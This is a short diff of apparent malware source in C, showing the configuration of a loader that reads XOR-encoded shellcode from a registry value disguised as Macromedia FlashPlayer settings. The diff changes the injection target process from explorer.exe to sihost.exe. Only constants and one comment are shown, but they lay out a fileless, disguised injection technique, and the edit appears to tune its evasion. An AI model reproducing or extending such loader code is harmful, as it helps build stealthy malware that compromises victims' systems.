@@ -22,7 +22,7 @@
 #define XOR_KEY             0x6B
 #define REG_SUBKEY          L"Software\\Macromedia\\FlashPlayer"
 #define REG_VALUE_NAME      L"Config"
-#define TARGET_PROCESS      L"explorer.exe"
+#define TARGET_PROCESS      L"sihost.exe"
 
 // -----------------------------------------------------------------------------
 // Read the XOR'd shellcode from the registry
